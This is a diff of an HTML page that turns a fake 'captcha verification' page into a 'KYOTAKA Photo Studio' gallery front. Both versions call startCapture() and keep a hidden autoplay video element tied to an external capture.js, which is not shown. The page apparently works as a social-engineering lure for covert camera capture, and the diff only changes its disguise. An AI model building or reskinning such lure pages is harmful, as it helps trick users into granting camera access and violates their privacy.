@@ -2,40 +2,135 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Captcha - Vérification</title>
+  <title>KYOTAKA Photo Studio</title>
   <style>
     body {
-      background-color: #0d0d0d;
-      color: #00ffcc;
-      font-family: 'Courier New', monospace;
+      background-color: #121212;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
+      padding: 2rem;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 2rem;
     }
     h1 {
-      font-size: 1.5em;
-      margin-bottom: 20px;
+      font-size: 2.5rem;
+      margin: 0;
+      background: linear-gradient(90deg, #00ffcc, #0099ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: 1px;
+    }
+    .subtitle {
+      color: #7a7a7a;
+      margin-top: 0.5rem;
+    }
+    .gallery-container {
+      width: 90%;
+      max-width: 800px;
+      background-color: #1e1e1e;
+      border-radius: 12px;
+      padding: 2rem;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    }
+    .photo-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    .photo-placeholder {
+      aspect-ratio: 1/1;
+      background-color: #2a2a2a;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #555;
+      font-size: 3rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .photo-placeholder:hover {
+      background-color: #333;
+    }
+    .controls {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 1rem;
     }
     button {
-      background-color: #00ffcc;
-      color: #0d0d0d;
+      background: linear-gradient(135deg, #00ffcc, #0099ff);
+      color: #121212;
       border: none;
-      padding: 10px 20px;
-      font-size: 1em;
+      padding: 12px 24px;
+      font-size: 1rem;
+      font-weight: 600;
       cursor: pointer;
-      border-radius: 5px;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 255, 204, 0.3);
     }
     video {
       display: none;
     }
+    .camera-button {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #ff00cc, #ff0066);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.5rem;
+      cursor: pointer;
+      box-shadow: 0 5px 20px rgba(255, 0, 102, 0.4);
+      z-index: 100;
+    }
   </style>
 </head>
 <body>
-  <h1>Veuillez valider le captcha pour continuer</h1>
-  <button onclick="startCapture()">Valider le Captcha</button>
+  <div class="header">
+    <h1>KYOTAKA PHOTO STUDIO</h1>
+    <p class="subtitle">Édition premium - Dark Mode</p>
+  </div>
+
+  <div class="gallery-container">
+    <div class="photo-grid">
+      <div class="photo-placeholder">+</div>
+      <div class="photo-placeholder">+</div>
+      <div class="photo-placeholder">+</div>
+      <div class="photo-placeholder">+</div>
+      <div class="photo-placeholder">+</div>
+      <div class="photo-placeholder">+</div>
+    </div>
+
+    <div class="controls">
+      <button onclick="startCapture()">Importer une photo</button>
+      <button>Effets Premium</button>
+      <button>Exporter</button>
+    </div>
+  </div>
+
+  <div class="camera-button" onclick="startCapture()">
+    📷
+  </div>
+
   <video id="video" autoplay></video>
   <script src="/static/capture.js"></script>
 </body>
